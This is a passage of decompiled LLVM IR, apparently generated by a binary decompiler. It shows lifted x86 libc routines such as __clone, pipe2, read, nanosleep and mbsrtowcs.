  store i32 %v2_805143c, i32* %eax.global-to-local, align 4
  %v1_805143e = call i32 @int80_syscall(i32 %v2_805143c)
  store i32 %v1_805143e, i32* %eax.global-to-local, align 4
  %v1_8051440 = icmp eq i32 %v1_805143e, 0
  %v1_8051442 = icmp eq i1 %v1_8051440, false
  br i1 %v1_8051442, label %dec_label_pc_805142a, label %dec_label_pc_8051444

dec_label_pc_8051444:                             ; preds = %dec_label_pc_805142f
  %v0_8051444 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051444 = and i32 %v0_8051444, -256
  %v2_8051444 = or i32 %v1_8051444, 7
  store i32 %v2_8051444, i32* %edx.global-to-local, align 4
  %v2_8051446 = add i32 %v1_805143e, 1
  %v14_8051446 = and i32 %v2_8051446, 255
  %v16_8051446 = and i32 %v1_805143e, -256
  %v17_8051446 = or i32 %v14_8051446, %v16_8051446
  store i32 %v17_8051446, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051428

; uselistorder directives
  uselistorder i32 %v17_8051446, { 1, 0 }
  uselistorder i32 %v1_805143e, { 2, 0, 3, 4, 1 }
  uselistorder i32* %stack_var_0, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 3, 0, 4, 1, 2, 5 }
}

define i32 @__clone(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %gs.global-to-local = alloca i16, align 2
  store i16 0, i16* %gs.global-to-local, align 2
  %v0_8051456 = load i16, i16* %gs.global-to-local, align 2
  %div = udiv i16 %v0_8051456, 8
  %v2_805145e = zext i16 %div to i32
  %v1_8051465 = and i32 %v2_805145e, 7936
  %v2_8051465 = or i32 %v1_8051465, 120
  %v1_805146d18 = add i32 %arg2, -16
  %v1_8051470 = and i32 %v1_805146d18, -16
  %v2_8051476 = inttoptr i32 %v1_8051470 to i32*
  store i32 %arg4, i32* %v2_8051476, align 16
  store i32 %arg1, i32* %ebp.global-to-local, align 4
  %v1_8051483 = call i32 @int80_syscall(i32 %v2_8051465)
  %v1_8051485 = icmp eq i32 %v1_8051483, 0
  %v1_8051487 = icmp eq i1 %v1_8051485, false
  br i1 %v1_8051487, label %dec_label_pc_8051497, label %dec_label_pc_8051489

dec_label_pc_8051489:                             ; preds = %entry
  %v0_8051489 = load i32, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_8051489)
  %v1_8051494 = call i32 @int80_syscall(i32 1)
  br label %dec_label_pc_8051497

dec_label_pc_8051497:                             ; preds = %entry, %dec_label_pc_8051489
  %v0_805149e = phi i32 [ %v1_8051483, %entry ], [ %v1_8051494, %dec_label_pc_8051489 ]
  ret i32 %v0_805149e

; uselistorder directives
  uselistorder label %dec_label_pc_8051497, { 1, 0 }
}

define i32 @nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v7_80514b8 = call i32 @__syscall_cp(i32 162, i32 %arg1, i32 %arg2, i32 0, i32 0, i32 0, i32 0)
  %v1_80514c4 = call i32 @__syscall_ret(i32 %v7_80514b8)
  ret i32 %v1_80514c4
}

; Function Attrs: noreturn
define i32 @_exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  %v1_80514d3 = call i32 @_Exit(i32 %arg1)
  ret i32 %v1_80514d3

; uselistorder directives
  uselistorder i32 (i32)* @_Exit, { 1, 0 }
}

define i32 @pipe2(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %v0_80514d8 = load i32, i32* @ebp, align 4
  %v0_80514d9 = load i32, i32* @edi, align 4
  %v0_80514da = load i32, i32* @esi, align 4
  %v0_80514db = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %tmp5, i32* @ebx, align 4
  %v1_80514e7 = icmp eq i32 %arg2, 0
  %v1_80514e9 = icmp eq i1 %v1_80514e7, false
  br i1 %v1_80514e9, label %dec_label_pc_80514f7, label %dec_label_pc_80514eb

dec_label_pc_80514eb:                             ; preds = %entry
  store i32 %v0_80514db, i32* @ebx, align 4
  store i32 %v0_80514da, i32* %esi.global-to-local, align 4
  %v1_80514f2 = call i32 @pipe(i32 %v0_80514db)
  %v0_80514fc.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80514f7

dec_label_pc_80514f7:                             ; preds = %entry, %dec_label_pc_80514eb
  %v0_80514fc = phi i32 [ %tmp5, %entry ], [ %v0_80514fc.pre, %dec_label_pc_80514eb ]
  store i32 331, i32* @eax, align 4
  store i32 %v0_80514fc, i32* @edx, align 4
  %v1_8051500 = call i32 @__vsyscall(i32 %v0_80514db)
  %v10_8051505 = icmp eq i32 %v1_8051500, -38
  br i1 %v10_8051505, label %dec_label_pc_805151a, label %dec_label_pc_805150a

dec_label_pc_805150a:                             ; preds = %dec_label_pc_80514f7
  store i32 %v0_80514db, i32* @ebx, align 4
  store i32 %v0_80514da, i32* %esi.global-to-local, align 4
  store i32 %v0_80514d9, i32* @edi, align 4
  store i32 %v0_80514d8, i32* %ebp.global-to-local, align 4
  %v1_8051515 = call i32 @__syscall_ret(i32 %v1_8051500)
  br label %dec_label_pc_805151a

dec_label_pc_805151a:                             ; preds = %dec_label_pc_80514f7, %dec_label_pc_805150a
  %v0_805151d = load i32, i32* @ebx, align 4
  store i32 %v0_805151d, i32* %stack_var_-44, align 4
  %v1_805151e = call i32 @pipe(i32 %v0_805151d)
  %v1_8051526 = icmp eq i32 %v1_805151e, 0
  store i32 %v1_805151e, i32* %ebp.global-to-local, align 4
  %v1_805152a = icmp eq i1 %v1_8051526, false
  br i1 %v1_805152a, label %dec_label_pc_8051581, label %dec_label_pc_805152c

dec_label_pc_805152c:                             ; preds = %dec_label_pc_805151a
  %v0_805152c = load i32, i32* %esi.global-to-local, align 4
  %v1_805152c = and i32 %v0_805152c, 524288
  %v2_805152c = icmp eq i32 %v1_805152c, 0
  br i1 %v2_805152c, label %dec_label_pc_8051557, label %dec_label_pc_8051534

dec_label_pc_8051534:                             ; preds = %dec_label_pc_805152c
  %v0_8051534 = load i32, i32* @ebx, align 4
  %v1_8051534 = inttoptr i32 %v0_8051534 to i32*
  %v2_8051534 = load i32, i32* %v1_8051534, align 4
  store i32 %v2_8051534, i32* @edx, align 4
  store i32 1, i32* @edi, align 4
  store i32 221, i32* @eax, align 4
  %v0_8051545 = load i32, i32* %stack_var_-44, align 4
  %v1_8051545 = call i32 @__vsyscall(i32 %v0_8051545)
  store i32 221, i32* @eax, align 4
  %v0_805154f = load i32, i32* @ebx, align 4
  %v1_805154f = add i32 %v0_805154f, 4
  %v2_805154f = inttoptr i32 %v1_805154f to i32*
  %v3_805154f = load i32, i32* %v2_805154f, align 4
  store i32 %v3_805154f, i32* @edx, align 4
  %v0_8051552 = load i32, i32* %stack_var_-44, align 4
  %v1_8051552 = call i32 @__vsyscall(i32 %v0_8051552)
  %v0_8051557.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051557

dec_label_pc_8051557:                             ; preds = %dec_label_pc_805152c, %dec_label_pc_8051534
  %v0_8051557 = phi i32 [ %v0_805152c, %dec_label_pc_805152c ], [ %v0_8051557.pre, %dec_label_pc_8051534 ]
  %v1_8051557 = and i32 %v0_8051557, 2048
  %v2_8051557 = icmp eq i32 %v1_8051557, 0
  store i32 %v1_8051557, i32* %esi.global-to-local, align 4
  br i1 %v2_8051557, label %dec_label_pc_8051581, label %dec_label_pc_805155f

dec_label_pc_805155f:                             ; preds = %dec_label_pc_8051557
  store i32 221, i32* %esi.global-to-local, align 4
  %v0_8051564 = load i32, i32* @ebx, align 4
  %v1_8051564 = inttoptr i32 %v0_8051564 to i32*
  %v2_8051564 = load i32, i32* %v1_8051564, align 4
  store i32 %v2_8051564, i32* @edx, align 4
  store i32 2048, i32* @edi, align 4
  store i32 221, i32* @eax, align 4
  %v0_8051572 = load i32, i32* %stack_var_-44, align 4
  %v1_8051572 = call i32 @__vsyscall(i32 %v0_8051572)
  %v0_8051577 = load i32, i32* @ebx, align 4
  %v1_8051577 = add i32 %v0_8051577, 4
  %v2_8051577 = inttoptr i32 %v1_8051577 to i32*
  %v3_8051577 = load i32, i32* %v2_8051577, align 4
  store i32 %v3_8051577, i32* @edx, align 4
  %v0_805157a = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_805157a, i32* @eax, align 4
  %v0_805157c = load i32, i32* %stack_var_-44, align 4
  %v1_805157c = call i32 @__vsyscall(i32 %v0_805157c)
  br label %dec_label_pc_8051581

dec_label_pc_8051581:                             ; preds = %dec_label_pc_8051557, %dec_label_pc_805151a, %dec_label_pc_805155f
  %v0_8051584 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_80514db, i32* @ebx, align 4
  store i32 %v0_80514da, i32* @esi, align 4
  store i32 %v0_80514d9, i32* @edi, align 4
  ret i32 %v0_8051584

; uselistorder directives
  uselistorder i32 %v1_8051500, { 1, 0 }
  uselistorder i32 %v0_80514db, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_80514da, { 1, 0, 2 }
  uselistorder i32 %v0_80514d9, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0, 3, 2, 4 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 5, 6, 3, 4, 7 }
  uselistorder i32 221, { 0, 9, 10, 11, 1, 3, 4, 2, 5, 6, 7, 8 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8051581, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051557, { 1, 0 }
  uselistorder label %dec_label_pc_805151a, { 1, 0 }
  uselistorder label %dec_label_pc_80514f7, { 1, 0 }
}

define i32 @read(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_80515a3 = call i32 @__syscall_cp(i32 3, i32 %arg1, i32 %arg2, i32 %arg3, i32 0, i32 0, i32 0)
  %v1_80515af = call i32 @__syscall_ret(i32 %v7_80515a3)
  ret i32 %v1_80515af

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__syscall_cp, { 3, 2, 4, 1, 10, 8, 0, 7, 6, 5, 9 }
}

define i32 @mbsrtowcs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %v0_80515b4 = load i32, i32* @ebp, align 4
  %v0_80515b5 = load i32, i32* @edi, align 4
  %v0_80515b6 = load i32, i32* @esi, align 4
  %v0_80515b7 = load i32, i32* @ebx, align 4
  %v4_80515c3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80515c3, i32* @ebp, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v1_80515d7 = icmp eq i32 %arg4, 0
  %v1_80515d9 = inttoptr i32 %arg2 to i32*
  %v2_80515d9 = load i32, i32* %v1_80515d9, align 4
  store i32 %v2_80515d9, i32* @ebx, align 4
  br i1 %v1_80515d7, label %dec_label_pc_80515fa, label %dec_label_pc_80515dd

dec_label_pc_80515dd:                             ; preds = %entry
  %v1_80515dd = inttoptr i32 %arg4 to i32*
  %v2_80515dd = load i32, i32* %v1_80515dd, align 4
  store i32 %v2_80515dd, i32* @esi, align 4
  %v1_80515df = icmp eq i32 %v2_80515dd, 0
  br i1 %v1_80515df, label %dec_label_pc_80515fa, label %dec_label_pc_80515e3

dec_label_pc_80515e3:                             ; preds = %dec_label_pc_80515dd
  %v1_80515e3 = icmp eq i8* %arg1, null
  store i32 %arg3, i32* %edi.global-to-local, align 4
  br i1 %v1_80515e3, label %dec_label_pc_80516b8, label %dec_label_pc_80515ef

dec_label_pc_80515ef:                             ; preds = %dec_label_pc_80515e3
  store i32 0, i32* %v1_80515dd, align 4
  %v0_8051791.pre = load i32, i32* @ebx, align 4
  %v0_8051793.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051791

dec_label_pc_80515fa:                             ; preds = %dec_label_pc_80515dd, %entry
  call void @llvm.trap()
  unreachable

dec_label_pc_8051678:                             ; preds = %dec_label_pc_8051707
  %v2_8051678 = urem i32 %v0_8051678, 4
  %v3_8051678 = icmp eq i32 %v2_8051678, 0
  br i1 %v3_8051678, label %dec_label_pc_8051685.preheader, label %dec_label_pc_8051696

dec_label_pc_8051685.preheader:                   ; preds = %dec_label_pc_8051678
  %v1_805168583 = inttoptr i32 %v0_8051678 to i32*
  %v2_805168584 = load i32, i32* %v1_805168583, align 4
  store i32 %v2_805168584, i32* %edx.global-to-local, align 4
  %v1_805168785 = add i32 %v2_805168584, -16843009
  %v2_805168d86 = or i32 %v1_805168785, %v2_805168584
  %v1_805168f87 = and i32 %v2_805168d86, -2139062144
  %v2_805168f88 = icmp eq i32 %v1_805168f87, 0
  br i1 %v2_805168f88, label %dec_label_pc_805167f, label %dec_label_pc_8051696.loopexit

dec_label_pc_805167f:                             ; preds = %dec_label_pc_8051685.preheader, %dec_label_pc_805167f
  %v0_805168290 = phi i32 [ %v1_8051682, %dec_label_pc_805167f ], [ %v1_8051707, %dec_label_pc_8051685.preheader ]
  %v0_805167f89 = phi i32 [ %v1_805167f, %dec_label_pc_805167f ], [ %v0_8051678, %dec_label_pc_8051685.preheader ]
  %v1_805167f = add i32 %v0_805167f89, 4
  store i32 %v1_805167f, i32* %ebx.global-to-local, align 4
  %v1_8051682 = add i32 %v0_805168290, -4
  store i32 %v1_8051682, i32* %edi.global-to-local, align 4
  %v1_8051685 = inttoptr i32 %v1_805167f to i32*
  %v2_8051685 = load i32, i32* %v1_8051685, align 4
  store i32 %v2_8051685, i32* %edx.global-to-local, align 4
  %v1_8051687 = add i32 %v2_8051685, -16843009
  %v2_805168d = or i32 %v1_8051687, %v2_8051685
  %v1_805168f = and i32 %v2_805168d, -2139062144
  %v2_805168f = icmp eq i32 %v1_805168f, 0
  br i1 %v2_805168f, label %dec_label_pc_805167f, label %dec_label_pc_8051696.loopexit

dec_label_pc_8051696.loopexit:                    ; preds = %dec_label_pc_805167f, %dec_label_pc_8051685.preheader
  %v0_805167f.lcssa = phi i32 [ %v0_8051678, %dec_label_pc_8051685.preheader ], [ %v1_805167f, %dec_label_pc_805167f ]
  %v0_8051682.lcssa = phi i32 [ %v1_8051707, %dec_label_pc_8051685.preheader ], [ %v1_8051682, %dec_label_pc_805167f ]
  br label %dec_label_pc_8051696

dec_label_pc_8051696:                             ; preds = %dec_label_pc_8051696.loopexit, %dec_label_pc_8051678, %dec_label_pc_8051707
  %v0_80516b7 = phi i32 [ %v0_805167f.lcssa, %dec_label_pc_8051696.loopexit ], [ %v0_8051678, %dec_label_pc_8051678 ], [ %v0_8051678, %dec_label_pc_8051707 ]
  %v0_805170729 = phi i32 [ %v0_8051682.lcssa, %dec_label_pc_8051696.loopexit ], [ %v1_8051707, %dec_label_pc_8051678 ], [ %v1_8051707, %dec_label_pc_8051707 ]
  %v1_8051696 = inttoptr i32 %v0_80516b7 to i8*
  %v2_8051696 = load i8, i8* %v1_8051696, align 1
  %v3_8051696 = zext i8 %v2_8051696 to i32
  store i32 %v3_8051696, i32* %edx.global-to-local, align 4
  %v1_8051699 = add nsw i32 %v3_8051696, -1
  %v5_805169c = icmp ult i32 %v1_8051699, 126
  %v9_805169c = icmp eq i8 %v2_8051696, 127
  %v2_805169f = or i1 %v9_805169c, %v5_805169c
  br i1 %v2_805169f, label %dec_label_pc_8051706, label %dec_label_pc_80516a1

dec_label_pc_80516a1:                             ; preds = %dec_label_pc_8051696
  %v1_80516a1 = add nsw i32 %v3_8051696, -194
  %v6_80516aa = icmp ugt i32 %v1_80516a1, 50
  br i1 %v6_80516aa, label %dec_label_pc_8051804, label %dec_label_pc_80516b0

dec_label_pc_80516b0:                             ; preds = %dec_label_pc_80516a1
  %v1_80516b0 = mul nsw i32 %v1_80516a1, 4
  %v2_80516b0 = add i32 %v1_80516b0, ptrtoint (i32* @global_var_80551cc.389 to i32)
  %v3_80516b0 = inttoptr i32 %v2_80516b0 to i32*
  %v4_80516b0 = load i32, i32* %v3_80516b0, align 4
  %v1_80516b7 = add i32 %v0_80516b7, 1
  store i32 %v1_80516b7, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80516b8

dec_label_pc_80516b8:                             ; preds = %dec_label_pc_80515e3, %dec_label_pc_80516b0
  %v0_805170728 = phi i32 [ %v0_805170729, %dec_label_pc_80516b0 ], [ %arg3, %dec_label_pc_80515e3 ]
  %v0_80516ef = phi i32 [ %v4_80516b0, %dec_label_pc_80516b0 ], [ %v2_80515dd, %dec_label_pc_80515e3 ]
  %v0_80516d6 = phi i32 [ %v1_80516b7, %dec_label_pc_80516b0 ], [ %v2_80515d9, %dec_label_pc_80515e3 ]
  %v1_80516b8 = inttoptr i32 %v0_80516d6 to i8*
  %v2_80516b8 = load i8, i8* %v1_80516b8, align 1
  %v2_80516bc = sdiv i32 %v0_80516ef, 67108864
  %v3_80516bf = udiv i8 %v2_80516b8, 8
  %v8_80516bf = zext i8 %v3_80516bf to i32
  %v2_80516c5 = add nsw i32 %v8_80516bf, %v2_80516bc
  %v1_80516c8 = add nsw i32 %v8_80516bf, -16
  %v2_80516cb = or i32 %v2_80516c5, %v1_80516c8
  %v1_80516cd = and i32 %v2_80516cb, -8
  %v2_80516cd = icmp eq i32 %v1_80516cd, 0
  store i32 %v1_80516cd, i32* %edx.global-to-local, align 4
  %v1_80516d0 = icmp eq i1 %v2_80516cd, false
  br i1 %v1_80516d0, label %dec_label_pc_80517ad, label %dec_label_pc_80516d6

dec_label_pc_80516d6:                             ; preds = %dec_label_pc_80516b8
  %v9_80516bc = and i32 %v0_80516ef, 33554432
  %v1_80516d6 = add i32 %v0_80516d6, 1
  store i32 %v1_80516d6, i32* %ebx.global-to-local, align 4
  %v2_80516d7 = icmp eq i32 %v9_80516bc, 0
  br i1 %v2_80516d7, label %dec_label_pc_8051707, label %dec_label_pc_80516df

dec_label_pc_80516df:                             ; preds = %dec_label_pc_80516d6
  %v1_80516df = inttoptr i32 %v1_80516d6 to i8*
  %v2_80516df = load i8, i8* %v1_80516df, align 1
  %tmp = and i8 %v2_80516df, -64
  %v6_80516e8 = icmp eq i8 %tmp, -128
  br i1 %v6_80516e8, label %dec_label_pc_80516ee, label %dec_label_pc_80517cd

dec_label_pc_80516ee:                             ; preds = %dec_label_pc_80516df
  %v1_80516ee = add i32 %v0_80516d6, 2
  store i32 %v1_80516ee, i32* %ebx.global-to-local, align 4
  %v1_80516ef = and i32 %v0_80516ef, 524288
  %v2_80516ef = icmp eq i32 %v1_80516ef, 0
  br i1 %v2_80516ef, label %dec_label_pc_8051707, label %dec_label_pc_80516f7

dec_label_pc_80516f7:                             ; preds = %dec_label_pc_80516ee
  %v1_80516f7 = inttoptr i32 %v1_80516ee to i8*
  %v2_80516f7 = load i8, i8* %v1_80516f7, align 1
  %tmp160 = and i8 %v2_80516f7, -64
  %v6_8051700 = icmp eq i8 %tmp160, -128
  br i1 %v6_8051700, label %dec_label_pc_8051706, label %dec_label_pc_80517e9

dec_label_pc_8051706:                             ; preds = %dec_label_pc_80516f7, %dec_label_pc_8051696
  %v0_8051706 = phi i32 [ %v1_80516ee, %dec_label_pc_80516f7 ], [ %v0_80516b7, %dec_label_pc_8051696 ]
  %v0_805170730 = phi i32 [ %v0_805170728, %dec_label_pc_80516f7 ], [ %v0_805170729, %dec_label_pc_8051696 ]
  %v1_8051706 = add i32 %v0_8051706, 1
  store i32 %v1_8051706, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051707

dec_label_pc_8051707:                             ; preds = %dec_label_pc_80516ee, %dec_label_pc_80516d6, %dec_label_pc_8051706
  %v0_8051678 = phi i32 [ %v1_80516ee, %dec_label_pc_80516ee ], [ %v1_80516d6, %dec_label_pc_80516d6 ], [ %v1_8051706, %dec_label_pc_8051706 ]
  %v0_8051707 = phi i32 [ %v0_805170728, %dec_label_pc_80516ee ], [ %v0_805170728, %dec_label_pc_80516d6 ], [ %v0_805170730, %dec_label_pc_8051706 ]
  %v1_8051707 = add i32 %v0_8051707, -1
  store i32 %v1_8051707, i32* %edi.global-to-local, align 4
  %v1_805166f = inttoptr i32 %v0_8051678 to i8*
  %v2_805166f = load i8, i8* %v1_805166f, align 1
  %v3_805166f = zext i8 %v2_805166f to i32
  %v1_8051672 = add nsw i32 %v3_805166f, -1
  %v6_8051676 = icmp ugt i32 %v1_8051672, 126
  br i1 %v6_8051676, label %dec_label_pc_8051696, label %dec_label_pc_8051678

dec_label_pc_8051711:                             ; preds = %dec_label_pc_8051775, %dec_label_pc_80517f4
  %v0_8051720.lcssa = phi i32 [ %v0_8051720118, %dec_label_pc_80517f4 ], [ %v1_8051778, %dec_label_pc_8051775 ]
  store i32 %v0_8051720.lcssa, i32* %v1_80515d9, align 4
  br label %dec_label_pc_8051841

dec_label_pc_8051720:                             ; preds = %dec_label_pc_80517f4, %dec_label_pc_8051775
  %v0_805176a.pre.pre101 = phi i32 [ %v1_8051778, %dec_label_pc_8051775 ], [ %v0_8051720118, %dec_label_pc_80517f4 ]
  %v1_80517fa120 = phi i32 [ %v1_80517fa, %dec_label_pc_8051775 ], [ %v1_80517fa114, %dec_label_pc_80517f4 ]
  %v1_8051779119 = phi i32 [ %v1_8051779, %dec_label_pc_8051775 ], [ %v1_8051779112, %dec_label_pc_80517f4 ]
  %v1_8051720 = inttoptr i32 %v0_805176a.pre.pre101 to i8*
  %v2_8051720 = load i8, i8* %v1_8051720, align 1
  %v3_8051720 = zext i8 %v2_8051720 to i32
  %v1_8051723 = add nsw i32 %v3_8051720, -1
  %v6_8051727 = icmp ugt i32 %v1_8051723, 126
  br i1 %v6_8051727, label %dec_label_pc_805176a, label %dec_label_pc_8051729

dec_label_pc_8051729:                             ; preds = %dec_label_pc_8051720
  %v2_8051729 = urem i32 %v0_805176a.pre.pre101, 4
  %v3_8051729 = icmp eq i32 %v2_8051729, 0
  br i1 %v3_8051729, label %dec_label_pc_8051754.preheader, label %dec_label_pc_805176a

dec_label_pc_8051754.preheader:                   ; preds = %dec_label_pc_8051729
  %v1_805175493 = add i32 %v1_80517fa120, -4
  %v5_805175494 = icmp ult i32 %v1_80517fa120, 4
  %v9_805175498 = icmp eq i32 %v1_805175493, 0
  %v2_8051757100 = or i1 %v5_805175494, %v9_805175498
  br i1 %v2_8051757100, label %dec_label_pc_805176a, label %dec_label_pc_8051759

dec_label_pc_8051730:                             ; preds = %dec_label_pc_8051759
  %v1_8051730 = inttoptr i32 %v0_805176a.pre.pre106 to i8*
  %v2_8051730 = load i8, i8* %v1_8051730, align 1
  %v3_8051730 = zext i8 %v2_8051730 to i32
  store i32 %v1_8051754103, i32* %edi.global-to-local, align 4
  %v2_8051736 = inttoptr i32 %v1_8051736102 to i32*
  store i32 %v3_8051730, i32* %v2_8051736, align 4
  %v0_8051739 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051739 = add i32 %v0_8051739, 1
  %v2_8051739 = inttoptr i32 %v1_8051739 to i8*
  %v3_8051739 = load i8, i8* %v2_8051739, align 1
  %v4_8051739 = zext i8 %v3_8051739 to i32
  %v1_805173d = load i32, i32* @ebp, align 4
  %v2_805173d = add i32 %v1_805173d, 4
  %v3_805173d = inttoptr i32 %v2_805173d to i32*
  store i32 %v4_8051739, i32* %v3_805173d, align 4
  %v0_8051740 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051740 = add i32 %v0_8051740, 2
  %v2_8051740 = inttoptr i32 %v1_8051740 to i8*
  %v3_8051740 = load i8, i8* %v2_8051740, align 1
  %v4_8051740 = zext i8 %v3_8051740 to i32
  %v1_8051744 = load i32, i32* @ebp, align 4
  %v2_8051744 = add i32 %v1_8051744, 8
  %v3_8051744 = inttoptr i32 %v2_8051744 to i32*
  store i32 %v4_8051740, i32* %v3_8051744, align 4
  %v0_8051747 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051747 = add i32 %v0_8051747, 3
  %v2_8051747 = inttoptr i32 %v1_8051747 to i8*
  %v3_8051747 = load i8, i8* %v2_8051747, align 1
  %v4_8051747 = zext i8 %v3_8051747 to i32
  %v1_805174b = add i32 %v0_8051747, 4
  store i32 %v1_805174b, i32* %ebx.global-to-local, align 4
  %v1_805174e = load i32, i32* @ebp, align 4
  %v2_805174e = add i32 %v1_805174e, 12
  %v3_805174e = inttoptr i32 %v2_805174e to i32*
  store i32 %v4_8051747, i32* %v3_805174e, align 4
  %v0_8051751 = load i32, i32* @ebp, align 4
  %v1_8051751 = add i32 %v0_8051751, 16
  store i32 %v1_8051751, i32* @ebp, align 4
  %v0_8051754.pre = load i32, i32* %edi.global-to-local, align 4
  %v1_8051754 = add i32 %v0_8051754.pre, -4
  %v5_8051754 = icmp ult i32 %v0_8051754.pre, 4
  %v9_8051754 = icmp eq i32 %v1_8051754, 0
  %v2_8051757 = or i1 %v5_8051754, %v9_8051754
  %v0_805176a.pre.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v2_8051757, label %dec_label_pc_805176a, label %dec_label_pc_8051759

dec_label_pc_8051759:                             ; preds = %dec_label_pc_8051754.preheader, %dec_label_pc_8051730
  %v0_805176a.pre.pre106 = phi i32 [ %v0_805176a.pre.pre, %dec_label_pc_8051730 ], [ %v0_805176a.pre.pre101, %dec_label_pc_8051754.preheader ]
  %v1_8051754103 = phi i32 [ %v1_8051754, %dec_label_pc_8051730 ], [ %v1_805175493, %dec_label_pc_8051754.preheader ]
  %v1_8051736102 = phi i32 [ %v1_8051751, %dec_label_pc_8051730 ], [ %v1_8051779119, %dec_label_pc_8051754.preheader ]
  %v1_8051759 = inttoptr i32 %v0_805176a.pre.pre106 to i32*
  %v2_8051759 = load i32, i32* %v1_8051759, align 4
  store i32 %v2_8051759, i32* %edx.global-to-local, align 4
  %v1_805175b = add i32 %v2_8051759, -16843009
  %v2_8051761 = or i32 %v1_805175b, %v2_8051759
  %v1_8051763 = and i32 %v2_8051761, -2139062144
  %v2_8051763 = icmp eq i32 %v1_8051763, 0
  br i1 %v2_8051763, label %dec_label_pc_8051730, label %dec_label_pc_805176a

dec_label_pc_805176a:                             ; preds = %dec_label_pc_8051754.preheader, %dec_label_pc_8051759, %dec_label_pc_8051730, %dec_label_pc_8051729, %dec_label_pc_8051720
  %v1_8051775 = phi i32 [ %v1_8051779119, %dec_label_pc_8051729 ], [ %v1_8051779119, %dec_label_pc_8051720 ], [ %v1_8051779119, %dec_label_pc_8051754.preheader ], [ %v1_8051736102, %dec_label_pc_8051759 ], [ %v1_8051751, %dec_label_pc_8051730 ]
  %v0_8051790 = phi i32 [ %v0_805176a.pre.pre101, %dec_label_pc_8051729 ], [ %v0_805176a.pre.pre101, %dec_label_pc_8051720 ], [ %v0_805176a.pre.pre101, %dec_label_pc_8051754.preheader ], [ %v0_805176a.pre.pre106, %dec_label_pc_8051759 ], [ %v0_805176a.pre.pre, %dec_label_pc_8051730 ]
  %v1_805176a = inttoptr i32 %v0_8051790 to i8*
  %v2_805176a = load i8, i8* %v1_805176a, align 1
  %v3_805176a = zext i8 %v2_805176a to i32
  store i32 %v3_805176a, i32* %edx.global-to-local, align 4
  %v1_805176d = add nsw i32 %v3_805176a, -1
  %v6_8051773 = icmp ugt i32 %v1_805176d, 126
  br i1 %v6_8051773, label %dec_label_pc_805177e, label %dec_label_pc_8051775

dec_label_pc_8051775:                             ; preds = %dec_label_pc_805176a
  %v2_8051775 = inttoptr i32 %v1_8051775 to i32*
  store i32 %v3_805176a, i32* %v2_8051775, align 4
  %v0_8051778 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051778 = add i32 %v0_8051778, 1
  store i32 %v1_8051778, i32* %ebx.global-to-local, align 4
  %v0_8051779.sink = load i32, i32* @ebp, align 4
  %v1_8051779 = add i32 %v0_8051779.sink, 4
  store i32 %v1_8051779, i32* @ebp, align 4
  %v0_80517fa = load i32, i32* %edi.global-to-local, align 4
  %v1_80517fa = add i32 %v0_80517fa, -1
  %v8_80517fa = icmp eq i32 %v1_80517fa, 0
  store i32 %v1_80517fa, i32* %edi.global-to-local, align 4
  %v1_805170f = icmp eq i1 %v8_80517fa, false
  br i1 %v1_805170f, label %dec_label_pc_8051720, label %dec_label_pc_8051711

dec_label_pc_805177e:                             ; preds = %dec_label_pc_805176a
  %v1_805177e = add nsw i32 %v3_805176a, -194
  %v6_8051787 = icmp ugt i32 %v1_805177e, 50
  br i1 %v6_8051787, label %dec_label_pc_8051804, label %dec_label_pc_8051789

dec_label_pc_8051789:                             ; preds = %dec_label_pc_805177e
  %v1_8051789 = mul nsw i32 %v1_805177e, 4
  %v2_8051789 = add i32 %v1_8051789, ptrtoint (i32* @global_var_80551cc.389 to i32)
  %v3_8051789 = inttoptr i32 %v2_8051789 to i32*
  %v4_8051789 = load i32, i32* %v3_8051789, align 4
  %v1_8051790 = add i32 %v0_8051790, 1
  store i32 %v1_8051790, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051791

dec_label_pc_8051791:                             ; preds = %dec_label_pc_80515ef, %dec_label_pc_8051789
  %v0_80517b3 = phi i32 [ %v0_8051793.pre, %dec_label_pc_80515ef ], [ %v4_8051789, %dec_label_pc_8051789 ]
  %v0_80517b8 = phi i32 [ %v0_8051791.pre, %dec_label_pc_80515ef ], [ %v1_8051790, %dec_label_pc_8051789 ]
  %v1_8051791 = inttoptr i32 %v0_80517b8 to i8*
  %v2_8051791 = load i8, i8* %v1_8051791, align 1
